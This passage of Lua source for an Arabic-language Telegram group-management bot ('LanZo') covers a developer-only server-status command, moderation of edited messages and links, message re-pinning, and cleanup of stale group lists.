{{text = '᥀ مبرمج السورس',url="t.me/lMlMMM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/FFFGF&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source LanZo     --
if text == 'معلومات السيرفر' or text == 'السيرفر' or text == '↫ السيرفر ᥀' then 
if not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo '᥀︙نظام التشغيل ↫ ⤈\n`'"$LinuxVersion"'`' 
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الذاكره العشوائيه ↫ ⤈\n`'"$MemoryUsage"'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الدخول ↫ ⤈\n`'`whoami`'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙مدة تشغيل السيرفر ↫ ⤈\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source LanZo     --
LanZoFiles(msg)
--     Source LanZo     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevaMeR:incr(LanZo..'aMeR:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevaMeR:get(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_) and not Text and not aMeRConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'الميديا'
if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
elseif result.content_.ID == "MessageVideo" then Media = 'الفيديو'
elseif result.content_.ID == "MessageAnimation" then Media = 'المتحركه'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local aMeRname = '᥀︙العضو ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local aMeRid = '᥀︙ايديه ↫ `'..dp.id_..'`'
local aMeRtext = '᥀︙قام بالتعديل على '..Media
local aMeRtxt = '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙تعالو يامشرفين اكو مخرب'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,aMeR) 
local admins = aMeR.members_  
text = '\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for i=0 , #admins do 
if not aMeR.members_[i].bot_info_ then
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, aMeRname..'\n'..aMeRid..'\n'..aMeRtext..text..aMeRtxt,0,'md') 
end
end,nil)
end
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevaMeR:get(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
--     Source LanZo     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = DevaMeR:get(LanZo..'aMeR:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevaMeR:del(LanZo..'aMeR:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevaMeR:del(LanZo..'aMeR:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevaMeR:del(LanZo..'aMeR:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevaMeR:del(LanZo..'aMeR:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     Source LanZo     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local PvList = DevaMeR:smembers(LanZo..'aMeR:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = DevaMeR:smembers(LanZo..'aMeR:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=LanZo,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevaMeR:srem(LanZo..'aMeR:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevaMeR:srem(LanZo..'aMeR:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevaMeR:srem(LanZo..'aMeR:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevaMeR:srem(LanZo..'aMeR:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
DevaMeR:sadd(LanZo..'aMeR:Groups',v)  
end end,nil) end
end
--     Source LanZo     --
end 
------------------------------------------------
-- This Source Was Developed By (aMeR) @lMlMMM.--
--   This Is The Source Channel @Bw5Bw .   --
--                - LanZo -                 --
--        -- https://t.me/Bw5Bw --         --
------------------------------------------------    
